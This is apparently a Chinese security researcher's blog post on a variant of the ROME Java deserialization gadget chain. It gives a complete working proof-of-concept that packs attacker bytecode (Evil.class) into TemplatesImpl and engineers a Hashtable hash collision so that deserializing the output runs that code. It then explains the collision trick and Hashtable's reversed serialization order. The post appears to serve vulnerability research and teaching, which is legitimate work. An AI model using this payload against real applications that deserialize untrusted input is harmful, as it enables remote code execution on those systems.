一，链条总览

HashTable.readObject()

->XString.equals(ToStringBean)

->ToStringBean.toString()

->getInstrance()

->类加载

二，poc

这条链子本质上并没有新增新的 Sink，也没有新增新的 Trigger，仅仅去掉了 HotSwappableTargetSource 这个 equals 转发 Gadget，因此需要主动制造 hash 冲突，并控制 equals 的调用方向。  

直接上 poc：

```plain
public class App {
    public static void main(String[] args) throws Exception {
        byte[] evilBytes = Files.readAllBytes(
                Paths.get("D:/intellij/Rome/Evil.class"));

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][]{evilBytes});
        setField(templates, "_name", "Evil");
        setField(templates, "_tfactory", new TransformerFactoryImpl());

        ObjectBean bean = new ObjectBean(Templates.class, templates);
        setField(getField(bean, "_equalsBean"), "_obj", "x");
        XString xStr = new XString("x");

        System.out.println("baen.hashcode:" + bean.hashCode());
        System.out.println("XString.hashcode:" + xStr.hashCode());

        Hashtable table = new Hashtable();
        table.put("test1", 2);
        table.put("test2", 2);

        Object[] tab = (Object[]) getField(table, "table");
        for (Object entry : tab) {
            if (entry == null)
                continue;
            Object key = getField(entry, "key");
            if ("test1".equals(key)) {
                // "test1" 在 bucket[5]（较小），必须放置后序列化的 ObjectBean
                setField(entry, "key", bean);
                setField(entry, "hash", bean.hashCode());
            } else if ("test2".equals(key)) {
                // "test2" 在 bucket[6]（较大），必须放置先序列化的 XString (作为栈顶出栈)
                setField(entry, "key", xStr);
                setField(entry, "hash", xStr.hashCode());
                break;
            }
        }


        System.out.println("=== serializing ===");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("rome03.ser"));
        oos.writeObject(table);
        oos.close();

        System.out.println("=== deserializing ===");
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("rome03.ser"));
        Hashtable result = (Hashtable) ois.readObject();
        ois.close();
    }
    static void setField(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }

    static Object getField(Object obj, String name) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        return f.get(obj);
    }
}
```

1.首先是关于 hash 冲突的构造

先查看 XString 类的 hashCode 方法

<!-- 这是一张图片，ocr 内容为：A HASH CODE VALUE FOR THIS OBJECT. @RETURN STR().HASHCODE();} PUBLIC NT HASHCODE() { RO INT RETURN -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785244433356-c1d5ee2f-6064-43ba-b5f7-db575dff8d44.png)

跟进 str()方法

<!-- 这是一张图片，ocr 内容为：PUBLIC STRING STR() RETURN (NULL !- M OBJ) ? (STRING) M OBJ) : "U; -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785244574083-4f5b222f-c6f8-4684-af11-994f238514d8.png)

方法返回一个字符串类型的 m_obj 或者空字符串，继续查看 m_obj 属性

<!-- 这是一张图片，ocr 内容为：PUBLIC CLASS XOBJECT EXTENDS EXPRESSION IMPLEMENTS SERIALIZABLE, CLONEABLE STATIC FINAL LONG SERIALVERSIONUID - 82188709898985662951L; THE JAVA OBJECT WHICH THIS OBJECT WRAPS. PROTECTED OBJECT M OBJ; // THIS MAY BE NULL!! CREATE AN XOBJECT. PUBLIC XOBJECT(){) CREATE AN XOBJECT. 形参: OBJ-CAN BE ANY OBJECT,SHOULD BE A SPECIFIC TYPE FOR DERIVED CLASSES,OR NULL. PUBLIC XOBJECT(OBJECT OBJ) SETOBJECT(OBJ); PROTECTED VOID SETOBJECT(OBJECT OBJ) { M_OBJ - OBJ; ] -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785244651257-66fcc7c1-a9c2-405d-bdb2-2245b22a453e.png)

XString 本身没有显示定义 m_obj 属性，而是继承自 XObject，可以看到这个 m_obj 也就是初始化时传入的一个可控参数，我们只要控制这个类的初始化就能控制 XString 类的 hash 值

再来查看查看 ObjectBean 是的 hashCode 方法，也就是 EqualsBean 中 的<font style="color:#080808;background-color:#ffffff;">beanHashCode 方法</font>

<!-- 这是一张图片，ocr 内容为：PUBLIC INT HASHCODE() { RETURN BEANHASHCODE(); RETURNS THE HASHCODE FOR THE OBJECT PASSED IN THE CONSTRUCTOR. IT FOLLOWS THE CONTRACT DEFINED BY THE OBJECT HASHCODEO METHOD. THE HASHCODE IS CALCULATED BY GETTING THE HASHCODE OF THE BEAN STRING REPRESENTATION. TO BE USED BY CLASSES USING EQUALSBEAN IN A DELEGATION PATTERN, 返回值:THE HASHCODE OF THE BEAN OBJECT. 请参阅:CONSTRUCTOR. BEANHASHCODE() PUBLIC INT _OBJ.TOSTRING().HASHCODE(); RETURN -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785244347404-dddff87c-b6ce-43f3-8348-3913febcfa3e.png)

可以看到 _obj.toString()hashCode()，_obj 也是我们可以控制的构造函数的参数，刚好也是将字符串进行 hash

那么如下制造 hash 冲突：

```plain
ObjectBean bean = new ObjectBean(Templates.class, templates);
setField(getField(bean, "_equalsBean"), "_obj", "x");
XString xStr = new XString("x");
```

2.hashtable 类存储桶的出入顺序

<!-- 这是一张图片，ocr 内容为：NEW HASHTABLE(); HASHTABLE TABLE TABLE.PUT("TEST1", 2); TABLE.PUT("TEST2", 2); OBJECT[] TAB - (OBJECT[] GETFIELD(TABLE, NAME:"TABLE"); FOR (OBJECT ENTRY : TAB){ IF (ENTRY - NULL) CONTINUE; OBJECT KEY - GETFIELD(ENTRY, NAME:"KEY"); IF ("TEST1".EQUALS(KEY)) { 1"在BUCKET[5](较小),必须放置后序列化的OBJECTBEAN //"TEST1"在 NAME:"KEY",BEAN); SETFIELD(ENTRY, NAME:"HASH", BEAN.HASHCODE()); SETFIELD(ENTRY, ELSE IF ("TEST2".EQUALS(KEY)) { 士2"在BUCKET[6](较大),必须放置先序列化的XSTRING(作为栈顶出栈) //"TEST2"在BU NAME:"KEY", XSTR); SETFIELD(ENTRY, NAME:"HASH", XSTR.HASHCODE()); SETFIELD(ENTRY, BREAK; -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785245039103-aea74731-4f13-482f-ac3a-0dc92b527330.png)

依旧是为了避免本地提前触发链子，我们先再 HashTable 中放入两个无关元素，避免放入元素时调用 equals 方法提前触发链子

在进行反射修改时属性时我遇到了两个问题，上一个 rome 链时我总结了 HashTable 类和 HashMap 类关于 equals 方法在调用方向上的不同，在构造这个链时我牢记这个规则，必须是 XString.equals(ToStringBean）,但是我先入为主的想先放进去的元素就是就会先处理，后放入的就会后处理，所以我将 XString 先放入 HashTable，ObjectBean 后放入，期望这样 XString 会先恢复，然后在 ObjectBean 恢复时触发 hash 冲突，此时就会按我预想调用 XString.equals 方法，但是元素放入存储同中的位置是通过对元素 hash 再对 table 数组长度取余确定的，先进去的不一定在最前面的位置，后进去的也不一定在靠后的位置，这里我放入的"test1"、“test2"他们的 hash 取余后一个放在 5 号桶，一个放在 6 号桶，恰巧满足了我想将 XString 放在前面的期望，但是实际运行的后发现并没有触发链子，调试时发现走的是 ObjectBean 的 euqlas 方法

为什么会这样？进行仔细的研究后发现，是 HashTable 在序列化时进行的特殊处理(备注:复现环境为 jdk8u65)

<!-- 这是一张图片，ocr 内容为：IN THE TABLE // STACK COPIES OF THE ENTRIES IN FOR (INT INDEX - O; INDEX NDEX < TABLE.LENGTH; INDEX++) { - TABLE[INDEX]; ENTRY<?,?> ENTRY WHILE (ENTRY !- NULL) ENTRYSTACK - ENTRY<>( HASH:O, ENTRY.KEY, ENTRY.VALUE, ENTRYSTACK); NEW ENTRY.NEXT; ENTRY 三 -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785245960567-0c8b38e2-b8ac-405a-aec0-23749f9c3598.png)

可以看到 Hashtable.writeObject() 并不是直接按照 table[] 顺序写出 Entry，而是先构造一个 LIFO 的 entryStack，使最终写出的 Entry 顺序与 table[] 遍历顺序相反，因此 readObject() 恢复对象的顺序也发生了反转  

so；

```plain
Object[] tab = (Object[]) getField(table, "table");
for (Object entry : tab) {
    if (entry == null)
        continue;
    Object key = getField(entry, "key");
    if ("test1".equals(key)) {
        // "test1" 在 bucket[5]（较小），必须放置后序列化的 ObjectBean
        setField(entry, "key", bean);
        setField(entry, "hash", bean.hashCode());
    } else if ("test2".equals(key)) {
        // "test2" 在 bucket[6]（较大），必须放置先序列化的 XString (作为栈顶出栈)
        setField(entry, "key", xStr);
        setField(entry, "hash", xStr.hashCode());
        break;
    }
}
```

